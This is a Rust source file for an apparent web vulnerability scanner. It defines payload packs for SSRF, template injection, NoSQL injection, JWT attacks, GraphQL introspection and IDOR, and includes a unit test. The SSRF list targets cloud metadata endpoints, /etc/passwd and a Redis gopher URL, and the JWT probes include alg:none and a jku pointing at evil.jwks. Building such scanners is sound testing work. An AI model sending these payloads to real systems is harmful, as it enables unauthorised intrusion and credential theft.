//! Modern payload packs — SSRF, JWT, GraphQL, NoSQL, SSTI, IDOR patterns.
//!
//! Sourced from OWASP WSTG, PayloadsAllTheThings categories, and 2025 DAST tooling
//! (crowbar-security, Escape DAST API-first checks). Used by native Rust scanners
//! and as seeds for local LLM payload expansion.

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ModernPayloadPack {
    pub ssrf: Vec<String>,
    pub ssti: Vec<String>,
    pub nosql: Vec<String>,
    pub jwt_probes: Vec<String>,
    pub graphql: Vec<String>,
    pub graphql_introspection: String,
    pub idor_patterns: Vec<String>,
}

impl Default for ModernPayloadPack {
    fn default() -> Self {
        Self {
            ssrf: vec![
                "http://127.0.0.1/".into(),
                "http://localhost/".into(),
                "http://169.254.169.254/latest/meta-data/".into(),
                "http://metadata.google.internal/computeMetadata/v1/".into(),
                "http://100.100.100.200/latest/meta-data/".into(),
                "file:///etc/passwd".into(),
                "gopher://127.0.0.1:6379/_".into(),
            ],
            ssti: vec![
                "{{7*7}}".into(),
                "${7*7}".into(),
                "#{7*7}".into(),
                "<%= 7*7 %>".into(),
                "{{config}}".into(),
            ],
            nosql: vec![
                r#"{"$ne": null}"#.into(),
                r#"{"$gt": ""}"#.into(),
                r#"{"$regex": ".*"}"#.into(),
                r#"{"$where": "1==1"}"#.into(),
            ],
            jwt_probes: vec![
                "alg:none".into(),
                "alg:HS256-with-RS256-key".into(),
                "jku:http://127.0.0.1/evil.jwks".into(),
                "kid:../../dev/null".into(),
            ],
            graphql: vec![
                r#"{"query":"{ __schema { types { name } } }"}"#.into(),
                r#"{"query":"query { __typename }"}"#.into(),
            ],
            graphql_introspection: r#"
                query IntrospectionQuery {
                  __schema { queryType { name } types { name kind } }
                }
            "#
            .trim()
            .into(),
            idor_patterns: vec![
                "/api/users/1".into(),
                "/api/users/2".into(),
                "/api/orders/1".into(),
                "/api/account?id=1".into(),
            ],
        }
    }
}

impl ModernPayloadPack {
    pub fn all_ssrf(&self) -> &[String] {
        &self.ssrf
    }

    pub fn merge_into_alerts_hint(&self) -> String {
        format!(
            "modern packs loaded: {} SSRF, {} SSTI, {} NoSQL, {} JWT probes",
            self.ssrf.len(),
            self.ssti.len(),
            self.nosql.len(),
            self.jwt_probes.len()
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn default_pack_has_cloud_metadata() {
        let p = ModernPayloadPack::default();
        assert!(p.ssrf.iter().any(|u| u.contains("169.254.169.254")));
    }
}
